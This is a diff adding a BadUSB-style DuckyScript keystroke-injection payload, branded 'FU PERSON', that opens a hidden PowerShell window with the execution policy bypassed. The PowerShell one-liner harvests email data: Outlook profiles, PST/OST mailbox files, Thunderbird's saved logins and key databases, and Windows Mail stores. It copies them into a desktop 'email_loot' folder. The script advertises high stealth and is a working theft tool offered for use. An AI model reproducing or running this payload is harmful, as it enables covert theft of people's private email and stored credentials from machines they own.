@@ -1,0 +1,12 @@
+REM ============================================
+REM  FU PERSON | Email Client Data Extraction
+REM  FLLC - by PERSON FU
+REM  Time: ~15 seconds | Stealth: HIGH
+REM  Outlook PST/OST, Thunderbird, mail configs
+REM ============================================
+DELAY 500
+GUI r
+DELAY 400
+STRING powershell -w hidden -ep bypass -c "$d=[Environment]::GetFolderPath('Desktop')+'\email_loot';md $d -f|Out-Null;$r=@();$r+='=== EMAIL HARVEST ===';$r+='Time: '+(Get-Date);$r+='';$r+='=== OUTLOOK PROFILES ===';try{(Get-ItemProperty 'HKCU:\Software\Microsoft\Office\*\Outlook\Profiles\*\*' -ea 0)|%{$r+=$_.PSPath}}catch{};$r+='';$r+='=== PST/OST FILES ===';@($env:LOCALAPPDATA,$env:USERPROFILE+'\Documents',$env:APPDATA+'\Microsoft\Outlook')|%{gci $_ -r -fi '*.pst','*.ost' -ea 0|%{$r+='[FOUND] '+$_.FullName+' ('+[math]::Round($_.Length/1MB,1)+' MB)';if($_.Length -lt 50MB){cp $_.FullName \"$d\$($_.Name)\" -f 2>$null;$r+='  -> Copied'}}};$r+='';$r+='=== THUNDERBIRD ===';$tb=\"$env:APPDATA\Thunderbird\Profiles\";if(Test-Path $tb){gci $tb -r -fi 'logins.json','key4.db','cert9.db','prefs.js' -ea 0|%{cp $_.FullName \"$d\tb_$($_.Name)\" -f 2>$null;$r+='[FOUND] '+$_.FullName}};$r+='';$r+='=== WINDOWS MAIL ===';$wm=\"$la\Packages\microsoft.windowscommunicationsapps*\LocalState\";gci $wm -r -ea 0|?{$_.Extension -match 'dat|db'}|select -f 10|%{$r+='[FOUND] '+$_.FullName};$r|Out-File \"$d\results.txt\" -Encoding UTF8"
+ENTER
+DELAY 500
